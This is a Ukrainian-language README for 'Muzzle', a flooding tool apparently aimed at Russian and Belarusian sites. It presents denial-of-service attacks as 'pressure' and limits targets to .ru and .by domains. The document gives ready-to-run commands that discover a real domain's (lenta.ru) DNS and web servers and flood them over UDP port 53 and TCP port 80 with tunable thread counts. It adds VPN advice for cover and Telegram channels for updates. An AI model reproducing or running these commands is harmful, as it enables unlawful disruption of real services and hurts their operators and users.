# Чому?

Сучасні інструменти для створення тиску на сайти мають деяки або усі проблеми, особливо для недосвідчених користувачей:

1. Декілька компонент які мають буті встановлені та налаштовані (python etc.)
2. Багато спеціалізованих параметрів котрі не є зрозумілими для новачків.
3. Одна ip адреса тиску при тому що сучасні системи мають декілька веб- та днс серверів.

# Рішення
Muzzle - простий у використанні інструмент на основі ЛОІСу, котрий виявляє всі DNS та Web сервери пов'язані з певним доменом та створює їм стресові умови.
Програма дозволяє тиск тільки на .ru та .by домени. Ми допомагаемо браттям, але тікому іншому.

#Встановлення та налаштування

1. Любі інструменти такого роду мають встановлюватись на віртуальну машину для безпеки.
2. Користуйтесь VPN. Наприклад https://clearvpn.com пропонує безкоштовний аккаунт на рік при використанні промо коду SAVEUKRAINE.
3. Обирайте ціль та запускайте прогу.

# Приклади команд

muzzle sniff -d lenta.ru
	Виявити та роздрукувати DNS та Web сервери пов'язані з доменом lenta.ru.

muzzle dns-flood -d lenta.ru
muzzle dns-flood -d lenta.ru -t 25
	Тиск на всі DNS сервери що належать lenta.ru по UDP порту 53. 
	Кількість одночасних з'єднань до кожного сервера (потоків) - параметр -t, за змовчуванням - 40.
	Зростання показника Requested - це добре.

muzzle http-flood -d lenta.ru
muzzle http-flood -d lenta.ru -t 35
	Тиск на всі Web сервери що належать lenta.ru по TCP порту 80 (HTTP). 
	Кількість одночасних з'єднань до кожного сервера (потоків) - параметр -t, за змовчуванням - 40.
	Зростання показника Downloaded або принаймні Requested - це добре.

muzzle help 
	Перелік команд.

muzzle version
	Роздрук версії програми.

Повідомлення про нові версії: https://t.me/getmuzzle
Питання та пропозиції: https://t.me/+guqhldDxOMw4YWUx
